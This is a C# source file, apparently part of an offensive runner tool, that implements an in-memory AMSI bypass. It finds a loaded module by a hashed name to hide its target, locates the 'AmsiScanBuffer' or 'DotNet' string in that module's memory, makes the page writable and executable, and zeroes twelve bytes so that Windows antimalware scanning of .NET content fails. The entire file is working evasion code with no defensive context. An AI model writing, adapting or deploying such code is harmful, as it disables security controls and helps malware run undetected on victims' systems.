using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        public static void ApplyPatch(ProcessModule clrModule, bool useSecondPattern)
        {
            byte[] pattern = useSecondPattern ? Encoding.UTF8.GetBytes("AmsiScanBuffer") : Encoding.Unicode.GetBytes("DotNet");

            if (clrModule == null) return;

            byte[] buffer = new byte[clrModule.ModuleMemorySize];
            Marshal.Copy(clrModule.BaseAddress, buffer, 0, buffer.Length);

            int offset = 0;
            for (int i = 0; i < buffer.Length; i++)
            {
                try
                {
                    for (int j = 0; j < pattern.Length; j++)
                    {
                        if (buffer[i + j] != pattern[j]) goto CONTINUE_SEARCH;
                    }
                    offset = i;
                    break;
                }
                catch { }
            CONTINUE_SEARCH:
                continue;
            }

            if (offset == 0) return;
            for (int i = 0; i < buffer.Length; i++) { buffer[i] = 0; }

            IntPtr patternAddr = clrModule.BaseAddress + offset;

            uint oldProtect;
            CustomVirtualProtect(patternAddr, (UIntPtr)12, 0x40, out oldProtect);
            CopyFunction(patternAddr, new byte[12] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 });
        }

        public static void PatchDotNetAMSI(bool useSecondPattern)
        {
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (HashString(module.FileName.Split('\\').Last()) == 0x6DA11442)
                {
                    ApplyPatch(module, useSecondPattern);
                }
            }
        }
    }
}
